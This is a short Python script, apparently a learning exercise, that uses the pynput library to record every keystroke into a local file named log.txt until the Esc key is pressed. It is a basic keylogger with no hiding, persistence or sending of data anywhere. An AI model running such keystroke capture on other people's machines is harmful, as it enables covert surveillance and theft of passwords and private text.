from pynput.keyboard import Listener, Key

# Dictionary to map special keys to their string equivalents
special_keys = {
    'Key.space': ' ',
    'Key.enter': '\n',
    'Key.tab': '\t',
    'Key.backspace': '',
    'Key.shift_r': '',
    'Key.shift_l': '',
    'Key.delete': '',
    'Key.ctrl_l': '',
    'Key.ctrl_r': '',
    'Key.alt_l': '',
    'Key.alt_r': '',
    'Key.caps_lock': ''
}

# Function to write keypresses to the log file
def write_to_file(key, log_file):
    letter = str(key).replace("'", "")

    # Use the dictionary to handle special keys
    letter = special_keys.get(letter, letter)

    try:
        log_file.write(letter)
    except IOError:
        print("An error occurred while writing to the file.")

def on_release(key):
    # Stop listener if needed (for example, on pressing a specific key)
    if key == Key.esc:  # Stops the listener on pressing 'esc'
        return False

# Clear the log file at the start of the program and open it in append mode
with open("log.txt", "w") as log_file:
    pass  # This clears the file

# Open the log file in append mode and start the listener
with open("log.txt", "a") as log_file:
    with Listener(on_press=lambda key: write_to_file(key, log_file), on_release=on_release) as listener:
        listener.join()
